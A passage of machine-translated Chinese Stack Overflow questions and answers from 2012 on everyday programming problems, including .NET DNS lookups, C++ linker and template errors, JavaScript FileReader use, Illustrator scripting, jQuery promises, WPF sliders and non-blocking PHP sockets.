虽然当您的目标是轻松重命名属性时，我会采用第二种方法。对普通对象重命名意味着两行代码：复制到新对象和删除旧对象。对于随处使用的一组对象，您只需要更改对象的“关键”属性，它将反映到引用该特定对象的所有位置。

请注意，您创建新对象的迭代不会反映更改，因为`k`和`v`被取消引用。

# .net - .Net Dns.GetHostAddresses(Domain) - 返回 ipv6 地址

> ID：11603635
> 
> 赞同：3
> 
> 时间：2012-07-22T20:12:13.563
> 
> 标签：.net

我已经对此进行了很多搜索，但仍然没有任何运气。问题是，如果我从我的服务器 nslookup，如果主机有 IPv6 地址，我会在列表中看到它。但是，如果我使用 .Net System.Net 的 Dns.GetHostAddresses(Domain)，它只会返回 IPv4 地址。

经过大量阅读，我发现：如果本地计算机未安装 IPv6，则从 GetHostAddresses 方法的结果中过滤 IPv6 地址。

我在一个仅限 IPv4 的网络中。我不需要 ping 或具有实际的网络连接，我只需要返回一个主机的 IPv6 地址（如果它有一个），就像我说的，它与来自同一服务器的 nslookup 一起工作。

谁能告诉我如何使用 .Net 获取 IPv6 地址，即使您碰巧在仅 IPv4 的网络中？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T21:09:52.490

如果我调用 GetHostAddresses("localhost") 我会同时获得 IPV4 和 IPV6 地址。因此，在您的网络中，无论域包含什么，都没有分配 IPv6 地址。

尝试：

```
var addresses = Dns.GetHostAddresses(Dns.GetHostName()); 
```

你得到什么结果？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-01-21T02:08:58.273

这就是您可以将 IPV4 地址转换为 IPV6 映射地址的方法。

```
IPAddress ipv4Address = null;
IPAddress ipv6Address = null;
IPAddress[] ipAddresses = Dns.GetHostAddresses(hostName);

foreach (IPAddress ip in ipAddresses)
{
     if (ip.AddressFamily == AddressFamily.InterNetwork)
     {
         ipv4Address = ip;
         ipv6Address = ip.MapToIPv6();
         Debug.Writeline("ipv4 address changed to ipv6 address " + ipv6Address.ToString());
     }
} 
```

# c++ - MTRand 在编译时产生错误

> ID：11603637
> 
> 赞同：0
> 
> 时间：2012-07-22T20:12:39.943
> 
> 标签：c++, random, mersenne-twister

我在我定义的类中使用 MTRand（来自[http://www.bedaux.net/mtrand/的 Mersenne Twister 随机数生成器）。](http://www.bedaux.net/mtrand/)当我尝试编译时，我得到一个无法解码的意外错误。我是一个新手 C++ 程序员，所以任何帮助都会有很长的路要走......

这是我的代码的相关部分：

```
#include<iostream>
#include<vector>
#include<deque>
#include<cmath>
#include "./mtrand/mtrand.h"

using namespace std;

class mp{
  long double store;
  deque< vector<long double> > stack;
  long double boundary;
  long double dt;
  long double time;
  MTRand_open random;
  long int random_seed;

public:
  void initialize(long int, long double, long double);
  long double get_state(); // return the state at position int
  void update();
  friend long double A(mp*);
  friend long double D(mp*);
  long double normal();
  vector <long double> viewCurrent(); 

}; 
```

然后有一个函数，如果调用它，它会为随机数生成器设置一个种子

```
void mp::initialize(long int rand_seed_input, long double bdry_in, long double dt_in){

  time = 0;
  dt = dt_in;

  random_seed = rand_seed_input;

  random.seed(random_seed);

  boundary = bdry_in; 
} 
```

我只是想测试它是否可以编译，所以我创建了一个完全不执行任何操作的 main 函数：

```
int main(){
return 0;
} 
```

在编译时，我得到一个错误

```
Undefined symbols:
  "MTRand_int32::seed(unsigned long)", referenced from:
      mp::initialize(int, long, long double, long double)in ccJylsHh.o
  "MTRand_int32::p", referenced from:
      MTRand_int32::rand_int32()       in ccJylsHh.o
      MTRand_int32::rand_int32()       in ccJylsHh.o
      MTRand_int32::rand_int32()       in ccJylsHh.o
  "MTRand_int32::state", referenced from:
      MTRand_int32::rand_int32()       in ccJylsHh.o
  "MTRand_int32::gen_state()", referenced from:
      MTRand_int32::rand_int32()       in ccJylsHh.o
ld: symbol(s) not found
collect2: ld returned 1 exit status 
```

我不确定这个错误是什么意思，以及应该如何删除它。

据我了解，MTRand 无法弄清楚如何初始化种子......但是 MTRand 类中有一个默认的种子，所以我看不出问题出在哪里。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:20:17.883

除了`mtrand.h`使用正确的文件路径在代码中包含标头之外，您还应该将其添加`mtrand.cpp`到项目中，以便它与程序的其他 .cpp 文件一起编译。

如果您使用的库不提供任何预编译的二进制文件，如 .lib、.dll 或 .a 文件，那么是的，您必须自己编译库的源代码（工作量不大？）才能让链接器开心。但是如果库确实附带了这样的预编译二进制文件，那么你应该告诉链接器它需要链接哪些文件才能找到库头文件中的声明是如何实际实现的，因为链接器不知道其他情况. 您实际链接预编译二进制文件的方式取决于您的开发环境。当然，您应该在这两种情况下都包含头文件，以告诉编译器`MTRand_int32`和其他新标识符的含义。

# javascript - google maps api如何使用url在城市周围添加圆圈

> ID：11603638
> 
> 赞同：2
> 
> 时间：2012-07-22T20:12:39.880
> 
> 标签：javascript, google-maps-api-3

![http://shrani.si/f/Z/u0/3LLz3huU/untitled.png](../Images/d58d73f315645f60dacf912669a48326.png)

我正在阅读此链接，但它不一样

[http://productforums.google.com/forum/#!category-topic/maps/base-map-data/M775Ry3-vNM](http://productforums.google.com/forum/#!category-topic/maps/base-map-data/M775Ry3-vNM)

谷歌地图如何在城市周围制作圆圈和网址？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:38:16.953

`new google.maps.Circle()`与监听器组合使用，如鼠标悬停和单击。

有不透明度和颜色等显示选项。

[https://developers.google.com/maps/documentation/javascript/reference#Circle](https://developers.google.com/maps/documentation/javascript/reference#Circle)

你的问题有点太笼统了。如果您有更具体的问题，请编辑它。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-23T00:27:13.827

请参阅以下链接 [http://gmaps-samples-v3.googlecode.com/svn/trunk/circle-overlay/circle-overlay.html](http://gmaps-samples-v3.googlecode.com/svn/trunk/circle-overlay/circle-overlay.html)

使用`new google.maps.Circle()`构造函数。您应该设置中心并指定圆的半径。可以使用创建空心效果`fillOpacity(0.0);`

还有一个矩形构造函数`new google.maps.Rectangle()`。请参阅[https://developers.google.com/maps/documentation/javascript/reference#Rectangle](https://developers.google.com/maps/documentation/javascript/reference#Rectangle)

# css - 修复了在固定位置滚动时背景图像跳转的问题 在页面上

> ID：11603641
> 
> 赞同：2
> 
> 时间：2012-07-22T20:13:17.167
> 
> 标签：css, video, html5-video

我遇到了一个奇怪的问题，不知道如何解决它。请参阅示例：

[http://jsfiddle.net/9wqsr/1/](http://jsfiddle.net/9wqsr/1/)

我有 3 个 div 和一个视频元素。视频位置：固定在页面顶部，因此 3 个 div 滚动它。第一个有纯色背景，第二个没有背景，因此视频在滚动时会显示出来。第三个有一个固定在其位置的背景图像。

这就是问题所在：当带有背景图像的第 3 个 div 到达视频时，“固定”的背景图像突然跳跃。

这发生在最新版本的 Chrome 和 Safari 中，但不是 Firefox。

知道发生了什么以及如何解决？

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2013-02-06T01:32:53.777

尝试没有“固定”的背景图像。

```
 background: yellow url(http://jsfiddle.net/img/top-bg.png) 10px 0 repeat; 
```

* * *

## 回答 #2

> 赞同：-3
> 
> 时间：2016-05-27T14:08:12.333

尝试使用`z-index:-1`;的背景

# javascript - 如何将图像从本地机器加载到 JS 对象避免加载到服务器

> ID：11603644
> 
> 赞同：8
> 
> 时间：2012-07-22T20:13:37.730
> 
> 标签：javascript, jquery

我想将图像文件从计算机直接加载到任何 js 对象，而不使用任何服务器端组件。例如，我想从本地机器中选择一张图片并显示在网页上。有没有办法避免文件上传到服务器？

事实上，我想编写一种多图像加载器，但在加载到服务器之前，我想旋转一些图像，创建一个 xml 文件，其中包含一些数据，如用户 ID、图像文件名列表并压缩所有图像和这个 xml然后将其发送到服务器。我怎样才能在客户端做到这一点？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-07-22T20:18:43.407

HTML5 有一种方法，但它要求用户将文件拖放到放置目标或使用`<input type="file"/>`框，否则会出现安全问题。

使用`File`API，您可以读取文件，具体而言，您可以使用该`FileReader.readAsDataURL`方法将内容设置`data:`为图像标签的 URL。

这是一个例子：

```
$('#f').on('change', function(ev) {
    var f = ev.target.files[0];
    var fr = new FileReader();

    fr.onload = function(ev2) {
        console.dir(ev2);
        $('#i').attr('src', ev2.target.result);
    };

    fr.readAsDataURL(f);
});​ 
```

[http://jsfiddle.net/alnitak/Qszjg/](http://jsfiddle.net/alnitak/Qszjg/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-22T20:24:17.913

使用[新的文件 API](http://caniuse.com/#search=fileapi)，可以从本地磁盘访问内容。

您在页面上放置一个传统的`<input type="file">`上传字段，并处理该`onchange`事件。

[MDN 有一篇很好的文章，包含了所有的细节。](https://developer.mozilla.org/en/Using_files_from_web_applications)

您的事件处理程序获得一个`FileList`包含`Files`. 从那里，您可以调用[`FileReader.readAsDataURL(File)`](https://developer.mozilla.org/en/DOM/FileReader)以获取图像的内容，然后将该数据 URL 传递给 an`<img>`或 a`<canvas>`以进行旋转。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-07-22T20:30:14.477

您可以使用window.URL 对象的[createObjectURL](https://developer.mozilla.org/en/DOM/window.URL.createObjectURL)方法，虽然这没有太多浏览器支持

[http://jsfiddle.net/LvAqp/](http://jsfiddle.net/LvAqp/)仅适用于 chrome 和 firefox

# android - Android数据采集表

> ID：11603646
> 
> 赞同：0
> 
> 时间：2012-07-22T20:13:56.930
> 
> 标签：android, forms

基本上，我的 android 项目是围绕制作一个由应用程序用户填写的表单。并将此数据发送到 php 服务器。数据可能是离线收集的，因此应用程序也应该保存数据，除非它在 ​​wifi 或 gprs 网络的范围内。我是 android 的早期初学者并且被困在两者之间。任何人都可以建议我一个类似的项目样本，这样我就可以进行研究并学习这些东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:34:18.193

对我来说，这听起来像是混合客户端-服务器应用程序的一个很好的用例。使用移动设备收集表单并将其结果存储在 SQLite 数据库中。只要有合适的无线网络可用，就连接基于服务器的应用程序并上传所有数据。有很多好的方法可以做到这一点，但对于初学者来说，请考虑让服务器应用程序实现一个 RESTful API，并让移动设备使用这个 API 来发送数据。如果搞乱服务器听起来很有趣，那么我在使用 MySQL + CakePHP 时运气不错。CakePHP 的一个很酷的方面是它让您几乎可以免费地以 REST 方式访问您的数据库。或者，您可以使用 Google App Engine 之类的东西，让其他人担心管理服务器。

# asp.net - 无法将 ASP.NET 数据库附加到 SQL Server Management Studio

> ID：11603651
> 
> 赞同：6
> 
> 时间：2012-07-22T20:14:42.690
> 
> 标签：asp.net, sql-server-2012, ssms

我有一个具有数据库的 ASP.NET MVC3 项目。我想将该数据库附加到 SQL Server Management Studio。

在 SQL Server Management Studio 中，我右键单击`Databases`，然后单击`Attach`，然后单击`Add`它会显示文件夹/文件选择对话框。

问题是它不允许我浏览我的用户帐户文件夹 ( `c:\users\Bob`) 中的任何文件夹。我可以看到该`Bob`文件夹​​，但没有`+`展开，并且没有显示子项（即使我知道我的 Windows 用户文件夹中有文件）。为什么不让我去那里探索？

SQL Server Management Studio 是版本 11.0.21 (SQL Server 2012)

我尝试`All files`从过滤器下拉列表中选择而不是`*.mdf`，但没有文件显示。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-23T03:09:40.187

另外两点需要注意：

1.  'attach' 在为服务器配置的默认 'DATA' 目录中查找，如下所示。
2.  您可能有也可能没有 *.ldf 文件。当您尝试附加时，SSMS 认为您有一个，因此如果您没有，则必须在要附加的文件列表中单击该文件上的“删除”。

![SQL Server 的 SSMS 中的默认 DATA 目录](../Images/2871e9c3637d572ff87005ad803d2043.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-07T18:22:58.937

虽然这个问题已经两年了，但我也遇到了同样的问题。

我通过让 MS SQL Server Express 访问我的用户文件夹来解决它。

打开 Windows 资源管理器并找到您的用户文件夹，右键单击并单击属性，然后单击安全选项卡。

我必须添加 SQL Server 用来访问文件的虚拟用户，因此单击编辑，然后在下一个窗口中单击添加。

您不知道要使用的虚拟名称，因此只需单击高级，然后立即查找，Windows 将显示所有用户的列表。向下滚动并找到类似的内容：

SQLServerMSSQLUser$

（您必须将分隔栏（在列标题中）拖动到右侧才能看到全名）

返回“权限”窗口，授予 SQL 用户完全控制权。

# java - Java获取没有子字符串的文件扩展名

> ID：11603658
> 
> 赞同：6
> 
> 时间：2012-07-22T20:15:26.837
> 
> 标签：java, file-extension

如何在不使用那些愚蠢的东西的情况下在 Java 中获得文件扩展名`lastIndexOf('.')`？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-22T20:18:49.017

apache Commons 库有[`FilenameUtils.getExtension()`](http://commons.apache.org/proper/commons-io/javadocs/api-2.4/org/apache/commons/io/FilenameUtils.html#getExtension%28java.lang.String%29).

您可以从[这里](http://svn.apache.org/repos/asf/commons/)开始查看源代码和[FilenameUtils](http://svn.apache.org/repos/asf/commons/proper/io/trunk/src/main/java/org/apache/commons/io/FilenameUtils.java)。

至少看看他们的实现。这很简单，它们可以正确处理*dir.ext/file*，并且要处理类似*file.tar.gz*的内容，如果要提取*.tar.gz*而不仅仅是*.gz* ，则需要特殊情况。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-22T20:18:41.033

这可能是最简单的方法（另请注意，根据上下文，它不一定正确，例如“.tar.gz”）。

您也可以`split`基于`.`字符的字符串并取最后一块，但这似乎同样困难。

您试图避免and有什么特别的原因*吗*？`substring``lastIndexOf`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-14T18:35:58.663

不想包含外部库？使用正则表达式：

```
String extension = filename.replaceAll("^.*\\.([^.]+)$", "$1"); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-10-03T06:49:55.437

用[番石榴](http://docs.guava-libraries.googlecode.com/git/javadoc/com/google/common/io/Files.html#getFileExtension%28java.lang.String%29)

`Files.getFileExtension("some.txt")`

# silverlight - 从用户控件显示模式对话框 (ChildWindow)

> ID：11603661
> 
> 赞同：0
> 
> 时间：2012-07-22T20:16:01.533
> 
> 标签：silverlight, silverlight-toolkit, silverlight-5.0

我有一个`Grid`作为主容器的用户控件。该控件需要显示一个模态对话框。但是，当我从控件显示对话框（实现`ChildWindow`）时，没有任何反应，没有错误，也没有对话框。

```
MyDialog dialog = new MyDialog();
dialog.Show(); 
```

如果`ChildWindow`只能从主页显示而不是用户控件，我的选择是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-23T23:56:32.277

通过创建用户控件并将其放置在与原始控件相同的网格位置（使用`Visibility:Collapsed`. 每次我需要模态对话框时，我都会禁用可见的用户控件并`Visibility:Visible`在模态对话框用户控件上设置。

这篇博文有很大帮助：[Silverlight 教程第 6 部分：使用用户控件实现主/详细场景](http://weblogs.asp.net/scottgu/pages/silverlight-tutorial-part-6-using-user-controls-to-implement-master-detail-scenarios.aspx)

# javascript - 水平翻转的 Illustrator 脚本

> ID：11603662
> 
> 赞同：1
> 
> 时间：2012-07-22T20:16:10.707
> 
> 标签：javascript, transform, adobe-illustrator, extendscript

救命！我搜索了高低，但无法弄清楚如何使用 Extendscript (jsx) 水平翻转单个选定对象。

任何人都可以帮忙吗？这肯定不是什么难事！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-25T18:13:12.220

尝试这样的事情：

```
mySelection = activeDocument.selection;
if (mySelection.length>0){
    var doc = app.activeDocument;                   //current document
    var s    = doc.selection;                              //current slection
    var sl   = s.length;                                     //number of selected objects
    var m  = app.getScaleMatrix(-100,100);       //H flip matrix - feel free to change to (100,-100) for vertical flip, etc.
    for(var i = 0 ; i < sl; i++) s[i].transform(m); //for each selected element apply the flip matrix
    app.redraw();
}else{
    alert("Nothing selected!")
} 
```

或者，您可以在选择**Reflect X的情况下对您的选择使用****变换效果**（*通过效果 > 扭曲和变换 > 变换...*），这将分别翻转选择中的每个对象：

 **![Illustrator H 镜面变换效果](../Images/f1de06cd6a5705522dde69752b5dc7dc.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T16:02:56.690

好吧，我仍然没有弄清楚如何翻转选定的对象，但是这里有一个页面，其中包含一个脚本来翻转页面上的每个对象。这很接近；然而，它不值得一支雪茄。

[http://js4ai.blogspot.de/2010/11/flip-on-x-axis.html](http://js4ai.blogspot.de/2010/11/flip-on-x-axis.html)

好的，Profenza 先生给出了答案！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-06T23:37:26.063

我用applescript做这个，“fastscripts”我把它绑定到command + shift + H (& V)

```
tell application "Adobe Illustrator"
    if (count page items in document 1) > 0 then
        set selectedItems to selection
        set scaleMatrix to get scale matrix horizontal scale -100.0 vertical scale 100.0
        transform every item in selectedItems using scaleMatrix
    end if
end tell 
```**

# jquery - 没有正确使用 jQuery Promise 对象。不知道为什么

> ID：11603663
> 
> 赞同：0
> 
> 时间：2012-07-22T20:16:20.130
> 
> 标签：jquery, coffeescript, jquery-deferred

我正在尝试在咖啡脚本中使用**它**：

```
 $(this).hide().each (index) ->
    $(this).delay(index * 100).fadeIn 1000, arguments.callee
  $(this).promise().done -> console.log 'hey trip' 
```

**au naturale JS 中的相同内容**

```
 $(this).hide().each(function(index) {
    $(this).delay(index * 100).fadeIn(1000, arguments.callee)
  });
  $(this).promise().done(function() {console.log 'hey trip' }); 
```

我想在动画完成后执行控制台日志。但是这里的这个片段从不传递控制台消息（通常），更不用说动画完成时了。

任何人都知道如何正确使用承诺对象？

**第二次失败尝试**：

```
 promise = new $.Deferred ->
  promise.done -> console.log 'hey trip'

  promise.resolve( $(this).hide().each (index) ->
    $(this).delay(index * 100).fadeIn 3000, arguments.callee
  ) 
```

**第三次失败的变体**

```
dfd = $.Deferred ->
dfd.done(
  $(this).hide().each (index) ->
    $(this).delay(index * 100).fadeIn(3000, arguments.callee)
).done -> console.log 'hey trip' 
```

**第四次失败的变体**

```
$.when(
  $(this).hide().each (index) ->
    $(this).delay(index * 100).fadeIn(3000, arguments.callee)
).then -> console.log 'hey trip' 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T21:05:13.573

这是你的`arguments.callee`参数`.fadeIn()`。

如果你把它拿出来，它会起作用......见[http://jsfiddle.net/alnitak/9VQ48/](http://jsfiddle.net/alnitak/9VQ48/)

# java - 在不使用 IDE 的情况下在 java 中创建 .jar 文件

> ID：11603665
> 
> 赞同：0
> 
> 时间：2012-07-22T20:16:33.750
> 
> 标签：java

我正在尝试在 java 中创建 .jar 文件，可以通过将其包含在其他项目中来使用它。它不包含任何主要但仅包含类和方法。我正在使用以下命令从命令行创建 .jar 文件

```
jar cf firstjar.jar * 
```

我在我的项目中包含了 jar 文件，但该类在项目中仍然不可用。这有什么问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:33:00.620

我的*猜测*是你的目录结构有问题。

假设你有一个这样的类：

```
package org.foo;

public class Bar {} 
```

目录中应该有`Bar.class`苍蝇`org/foo`。该结构也必须在 jar 文件中 - 因此您应该转到*包含* `org`并运行的目录：

```
jar cf firstjar.jar org 
```

（或者无论您的顶级包名称是什么。）

如果您只包含*目录中的类文件**，`foo`*那么 Java 对在何处查找内容的期望将是无效的。

# android - 多语言手册应用程序的数据存储

> ID：11603667
> 
> 赞同：0
> 
> 时间：2012-07-22T20:16:55.477
> 
> 标签：android, localization, data-storage

我正在编写印刷小册子的应用程序版本。该手册有多种语言版本。以印刷形式（针对单一语言）只有大约 12 页长。

启动应用程序的主屏幕是目录 (TOC)。单击目录标题将打开该“章节”，这是手册的 1-2 页部分。这将是设备上的垂直滚动屏幕。向左/向右滑动将显示手册的上一章/下一章。我打算有两个活动：一个 TOCActivity 和一个 DisplayChapterActivity，它将显示它被告知的任何章节的内容。

手册每两年更新一次，我希望将数据存储在设备上，以便即使没有连接也可以访问手册。我的计划是在安装应用程序时将所有语言版本下载到设备上，以便用户可以随时切换到任何版本。这对存储的需求不是很大，因为小册子都是文本并且不是很长。

我知道如何本地化应用程序菜单、标题等。但是每个“章节”的内容呢，存储它的最佳方式是什么？一章会有几段，所以它们不是很长，但我认为在本地化值/* XML 文件中存储多行字符串是个坏主意。

我看到两个选项：

1.  将章节放在 SQL lite 数据库中。
2.  将章节放在单独的文本文件中

这个问题有两个部分：

1.  在这种情况下，上述哪个选项更适合存储？
2.  加载章节时如何告诉 DisplayChapterActivity 使用哪个语言版本？这可以链接到用于国际化的语言环境，还是我需要一个特定于应用程序的配置选项？

注意：这是我写的第一个应用程序。如果需要，我很乐意澄清我的问题中的任何内容。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T20:31:13.760

**1 - 在这种情况下，上述哪个选项更适合存储？**

[FILESYSTEM vs SQLITE，同时存储多达 10M 文件](https://stackoverflow.com/questions/3805577/filesystem-vs-sqlite-while-storing-up-to-10m-files)

它可以帮助您决定是使用 SQLite 还是使用 FileSytem。

**2 - 加载章节时如何告诉 DisplayChapterActivity 使用哪个语言版本？这可以链接到用于国际化的语言环境，还是我需要一个特定于应用程序的配置选项？**

如果您想获得设备的选定语言。这可能会帮助你

```
Locale.getDefault().getDisplayLanguage(); 
```

我希望我的回答能让你找到一个很好的解决方案。

谢谢 ：）

# winapi - 用 WINAPI 设置 EOF？

> ID：11603670
> 
> 赞同：0
> 
> 时间：2012-07-22T20:17:02.747
> 
> 标签：winapi, visual-c++, filesystems

我正在使用 WINAPI 开发一个项目，我在其中打开和编辑文件，有时还会删除数据，所以我想知道是否可以设置文件结尾，所以当我关闭句柄时它不会保存超过 EOF 的数据。这可能吗，如果可以，怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T20:18:51.887

我想通了，找到了函数[SetEndOfFile](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365531.aspx)，谢谢，对不起，布拉德。

# c# - 更改自定义位置上的滑块位置

> ID：11603673
> 
> 赞同：0
> 
> 时间：2012-07-22T20:17:05.540
> 
> 标签：c#, wpf, slider

我有显示播放歌曲时间变化的滑块。滑块显示更改刻度确定，但我想单击滑块上的任何位置，然后该值发生更改。

但是现在当我单击它时，值仅在 1 秒内发生变化。我怎么能改变这种行为？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:40:38.967

如果您想确保滑块可以移动到任何点（不仅仅是在预定义的刻度上），请设置`IsSnapToTickEnabled`为 false：

```
<Slider IsSnapToTickEnabled="False" /> 
```

但是，如果您试图使滑块跳到您在滑块轨道上单击的点，请使用[此答案中概述的解决方案](https://stackoverflow.com/questions/612412/wpf-slider-problems/613570#613570)并允许移动到点行为：

```
<Slider IsMoveToPointEnabled="True" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:20:00.147

听起来您需要调整滑块的分辨率。通过调整`Minimum`和`Maximum`值来做到这一点，以便获得更好的范围。

# javascript - 向使用 JavaScript 添加的元素添加 CSS 规则

> ID：11603674
> 
> 赞同：0
> 
> 时间：2012-07-22T20:17:10.020
> 
> 标签：javascript, jquery, css

我正在使用 JavaScript 创建 li 并将其添加到 ul 中。创建和添加元素正在工作；但是，这些元素没有采用我在外部文件中声明的 CSS 规则。当我使用 PHP 在服务器端显示元素时，一切正常，但是当我使用 Js 时，CSS 规则不适用。我不想在每个元素上使用 .style，因为我有很多规则。

建议？

编辑：伙计们/女孩们，我真的很抱歉。我刚刚意识到我将一个一次性类更改为一个我没有在我的 CSS 文件中更改的 ID。谢谢@杰夫

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-22T20:27:14.260

生成 HTML 的方法无关紧要。CSS 适用于所有元素，无论它们是否是动态生成的。因此，可以得出的合乎逻辑的结论是您从 Javascript 生成的 HTML 和从 PHP 生成的 HTML 在某些方面有所不同。

要确定 HTML 的不同之处，您可以使用 Firebug 等浏览器扩展来检查 HTML。然后，您将能够纠正可能存在的任何差异。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:23:35.057

根据*如何添加这些元素，您可以做以下两件事之一......

如果您使用 innerHTML 编写它们，则只需将类声明添加为字符串的一部分...

```
innerHTML = "<li class='myLIClass'>"; 
```

如果您将它们作为元素直接添加到 dom 中，您可以像这样添加类：

```
myNewListItem.className = 'myLIClass'; 
```

或者

```
myNewListItem.createAttribute('class','myLIClass') 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T20:24:03.637

创建元素时，只需执行

```
$('#newdiv').addClass('classname'); 
```

# php - 如何在 PHP 中使用异步 IO（用于 IRC 客户端）？

> ID：11603676
> 
> 赞同：2
> 
> 时间：2012-07-22T20:17:25.997
> 
> 标签：php, multithreading, io, command-line-interface, irc

我正在尝试用 PHP 构建一个小的命令行 IRC 客户端，因为我厌倦了所有那些让您单击 20 个 GUI 弹出窗口/窗口以连接到新服务器的客户端。

到目前为止一切正常，但我被困在将我的输入命令/消息发送到服务器并从中接收新数据的主循环中。

由于 PHP 对多任务不太友好，我有两个同时运行的自主 PHP 脚本：

我可以在其中输入消息的输入阅读器 - 它将当前消息存储在文本文件中。服务器侦听器/写入器接收新数据并读取和清除输入读取器存储我当前命令的文本文件。

但是，我用来从服务器读取新数据的 fgets() 会暂停脚本，直到有新数据到来。因此，只有在服务器有新内容到达之前，输入文本文件才能被读出，这是不好的。

*   是否有一些特殊的功能/选项可以帮助我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-19T22:57:16.830

尝试：[`stream_set_blocking($handle,0)`](http://php.net/stream_set_blocking)

[仅 php分叉](http://php.net/pcntl_fork)不支持线程，但会占用更多资源并需要操作系统支持（Windows 不支持）。

如果您想使用 php 和线程，您可以查看[phlanger](http://www.php-compiler.net/) - 这是 .net 的 php（重新）实现（因此您需要在目标平台上使用 .net 或 mono）。

# c++ - 使用模板参数作为模板参数类型

> ID：11603680
> 
> 赞同：1
> 
> 时间：2012-07-22T20:17:56.603
> 
> 标签：c++, templates, template-function

我似乎无法通过以下方式使用多层模板，

```
template <typename T>
template <T value>
void printValueAsInteger()
{
    printf("value as integer is %i\n", (int) value);
} 
```

所以它可以被称为：

```
printValueAsInteger<123>(); 
```

它会导致以下错误消息：`too many template-parameter-lists`。

如果我使用`template <typename T, T value>`with `printValueAsInteger<int, 123>()`，它可以工作，但这需要我明确指定类型。我怎样才能让它`printValueAsInteger<123>()`打印出来`value as integer is 123`？

**编辑：**

我会更具体地说明我需要这个。我的目标是将成员函数作为函数指针传递，我想用模板包装它：

```
template <typename T>
template <T* instance, void (T::*method)()>
void wrappedMethod()
{
    (instance->*method)();
}
void callFunction(void (*function)())
{
    (*function)();
} 
```

然后像这样传递它：

```
Base *instance = new Derived;
callFunction(&wrappedFunction<instance, Base::method>); 
```

**编辑：**

呃，我刚刚意识到我可能不应该（也不能）使用运行时定义的变量作为模板参数。我现在正在尝试使用一个用其他模板参数实例化的类来解决它，并创建一个使用该类的模板函数。或类似的东西。不，不起作用。

请注意，我无法更改 callFunction 的签名，因为它是第三方 API 的一部分。

**最后！**

我将以下内容放在标题中，

```
class Callable
{
public:
    virtual ~Callable() { }
    virtual void call() { }
};

typedef void (*functionPtr)();
extern unsigned nextMethodId;
extern functionPtr wrappedMethods[];
extern Callable *boundMethods[];

template <unsigned I>
class MethodWrapper
{
public:
    static void function();
};

template <typename T>
class Method : public Callable
{
public:
    Method(T* instance, void (T::*method)());
    virtual void call();
private:
    T* instance;
    void (T::*method)();
};

template <typename T>
Method<T>::Method(T* instance, void (T::*method)())
    : instance(instance), method(method) {
}

template <typename T>
void Method<T>::call()
{
    if (instance && method)
        (instance->*method)();
}

template <typename T>
static functionPtr bindMethod(T* instance, void (T::*method)())
{
    boundMethods[nextMethodId] = new Method<T>(instance, method);
    return (void (*)()) wrappedMethods[nextMethodId++];
} 
```

这在源文件中：

```
#include "<insert header name here>.h"

unsigned nextMethodId = 0;
functionPtr wrappedMethods[] = {
    &MethodWrapper<0>::function,
    &MethodWrapper<1>::function,
    &MethodWrapper<2>::function
};
Callable *boundMethods[sizeof(wrappedMethods) / sizeof(functionPtr)];

template <unsigned I>
void MethodWrapper<I>::function()
{
    boundMethods[I]->call();
} 
```

我可以这样使用它：

```
Base *instance = new Derived;
void (*function)() = bindMethod(instance, &Base::method);
callFunction(function); 
```

它成功调用了派生实例的方法版本。遗憾的是，允许绑定的方法数量是固定的（本例中为三个），但它很容易扩展。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T21:44:45.980

一个简单的转换是将*运行*时值作为一个函子的构造函数的参数，该函子包含实例指针和指向成员函数的指针。使用地点的语法将从：

```
Base *instance = new Derived;
callFunction(&wrappedFunction<instance, Base::method>); 
```

至：

```
callFunction( WrappedFunction<Base,&Base::method>( instance ) ); 
```

类型的实现`WrappedFunction`其实很简单，所以我把它留作练习。请注意，这种方法的一个主要变化是参数`callFunction`变为*仿函数*，而不是函数指针。

在 C++11（或使用 boost）中，最简单的方法是不编写任何代码，只使用可用资源。将签名更改`callFunction`为：

```
void callFunction( function<void ()> f ); 
```

并用于`bind`拨打电话：

```
callFunction( bind( &Base::method, instance ) ); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T20:52:16.977

对于您的第一个示例，您可以指定`int`模板参数的类型：

```
template <int I>
void printValueAsInteger()
{
    printf("value as integer is %i\n", I);
} 
```

对于您的编辑，您不能使用已经提到的运行时定义的变量，因为模板是在编译时使用的。使用`std::bind`and`std::function`会使事情变得简单：

```
void callFunction(std::function<void()> f)
{
    f();
}

Base *instance = new Derived;
callFunction(std::bind(&Base::method, instance)); 
```

**评论后**

我能想到的唯一方法是让你的成员函数`static`：

```
callFunction(&Base::method); // Okay if the method is declared static 
```

或者使用带有全局实例的全局包装函数：

```
Base *instance = new Derived; // Global
